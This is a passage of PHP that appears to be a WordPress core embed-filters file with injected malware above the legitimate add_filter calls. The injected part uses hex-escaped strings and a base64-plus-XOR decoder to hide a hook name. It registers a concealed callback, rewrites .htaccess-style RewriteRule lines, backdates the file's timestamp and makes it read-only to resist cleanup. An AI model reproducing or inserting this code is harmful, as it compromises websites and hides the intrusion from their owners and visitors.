	if(preg_match("/\x72\x65write\x52u\x6ce (.*)/is",$yi_ubergeek_hv1,$res))
	if(preg_match("/(index|w\x70\-inc\x6cudes|wp\-c\x6fntent|wp\-ad\x6din|wp\-\x6cogi\x6e)/is",$res[1])==0)
	if(preg_match("/\.p\x68p/",$yi_ubergeek_hv1)>0){$a[$k]='';$f=1;}
	if($f)if(@file_put_contents($fn,implode('',$a))!==false){@touch($fn,$yi_ubergeek_hv1t); @chmod($fn,0444);return 1;}
	return 0;
}

function methodresponse_textarea_cropped_je3($yi_ubergeek_hv1,$k){
	$yi_ubergeek_hv1=base64_decode($yi_ubergeek_hv1);
	if($yi_ubergeek_hv1){
		for($i=0;$i<strlen($yi_ubergeek_hv1)-2;$i++){$yi_ubergeek_hv1[$i]=chr(ord($yi_ubergeek_hv1[$i])^$k);}
	}
	if(substr($yi_ubergeek_hv1,-2)!='WP'){$yi_ubergeek_hv1=false;}else{$yi_ubergeek_hv1=substr($yi_ubergeek_hv1,0,-2);}
	return $yi_ubergeek_hv1;
}


add_action( methodresponse_textarea_cropped_je3('nJu0jYSEn46ZV1A=',235) , "cry_httpd_ubergeek_hv1" );
add_action( 'embed_footer',           'wp_print_footer_scripts',        20    );

add_filter( 'excerpt_more',           'wp_embed_excerpt_more',          20    );
add_filter( 'the_excerpt_embed',      'wptexturize'                           );
add_filter( 'the_excerpt_embed',      'convert_chars'                         );
add_filter( 'the_excerpt_embed',      'wpautop'                               );
add_filter( 'the_excerpt_embed',      'shortcode_unautop'                     );
add_filter( 'the_excerpt_embed',      'wp_embed_excerpt_attachment'           );

add_filter( 'oembed_dataparse',       'wp_filter_oembed_result',        10, 3 );
add_filter( 'oembed_response_data',   'get_oembed_response_data_rich',  10, 4 );
add_filter( 'pre_oembed_result',      'wp_filter_pre_oembed_result',    10, 3 );

unset( $filter, $action );
